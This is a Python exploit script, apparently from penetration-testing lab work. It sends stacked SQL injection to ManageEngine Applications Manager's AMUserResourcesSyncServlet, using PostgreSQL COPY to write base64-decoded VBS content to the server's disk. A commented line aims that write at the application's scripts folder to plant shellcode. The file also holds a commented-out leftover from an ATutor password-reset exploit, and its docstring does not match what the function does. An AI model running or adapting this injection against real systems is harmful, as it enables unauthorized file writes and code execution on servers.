#!/bin/env/python3
import sys
import requests
import urllib3
import urllib.parse
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def getPayload(path="shellcode.vbs"):
    """
    This funciton will be used to read file with the payload
    """
    f = open(path, "r")
    line = f.readline().replace("\n","")
    #In order to base64 encode a string:
    #1. Encode string in ascii, then base64 encode - this give byte string, then encode in ascii again
    #This will create byte string of the our payload, e.g. b'test string'
    base64_line = base64.b64encode(bytes(line, 'utf-8'))
    print('base64_line: {}'.format(base64_line))

    #Need to convert base64 byte string to ascii string
    base64_string = base64_line.decode('ascii')
    print('base64_string: {}'.format(base64_string))


    #Url encode string
    urlencode_b64_string = urllib.parse.quote(base64_line)
    print(urlencode_b64_string)

    f.close()
    return base64_string

def readShellcode(path="./urlencoded_shellcode.txt"):
    """
    This function will be used to read in url encoded shellcode from a file
    """
    f = open(path, "r")
    line = f.readline()
    f.close()
    return line.strip('\n')

def test_inject(ip):
    """
    This will reset the password for the target user
    """
    shellcode = readShellcode("base64_encoded_wmiget.txt")
    #payload = "1;copy(select+convert_from(decode($${}$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\test.vbs$$;".format(shellcode)
    payload = "1;copy(select+convert_from(decode($${}$$,$$base64$$),$$utf-8$$))+to+$$C:\\\\test2.vbs$$;".format("SGVsbG8sIFdvcmxk")
    print('base64 shellcode: {}'.format(shellcode))


    print('(+) Attempting to inject url')

    #Target URL is: https://%s//servlet/AMUserResourcesSyncServlet?ForMasRange=&userId=?
    url = "https://{}:8443/servlet/AMUserResourcesSyncServlet".format(ip)
    #payload = '1;select+pg_sleep(100);'
    #payload = '1;'
    params = {
                "ForMasRange": "1",
                "userId": payload
             }

    proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

    headers = {
                #'Content-Type':'application/x-www-form-urlencoded',
                'Host':'manageengine:8443',
                'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language':'en-US,en;q=0.5',
                'Accept-Encoding':'gzip, deflate'
            }
    r = requests.post(url, json=params, proxies=proxies, headers=headers, verify=False)
    print(r.text)
    print(r.headers)
    """
    headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
            }

    proxies = {'http':'http://127.0.0.1:8080'}

    s = requests.Session()

    #Need to first go to the "http://atutor/ATutor/password_reminder.php" webpage
    url = 'http://%s/ATutor/password_reminder.php' % (ip)
    r = s.get(url, headers=headers, proxies=proxies)
    res = r.text


    url = 'http://%s/ATutor/password_reminder.php?id=%s&g=%s&h=0' % (ip, str(id), str(gen))

    r = s.get(url, headers=headers, proxies=proxies)
    res = r.text

    if "Enter a new password for your account." in res:
        print('(+) Successful in submitting hash to the password reset form')

    """

def main():
    """
    This is the main function
    """
    if len(sys.argv) != 2:
        print('(+) usage: %s <target_ip> ' % sys.argv[0])
        print('(+) e.g.: %s 192.168.137.113 ' % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    #print(readShellcode("encoded_wmiget.txt"))
    #print('test')
    test_inject(ip)

if __name__ == "__main__":
    main()
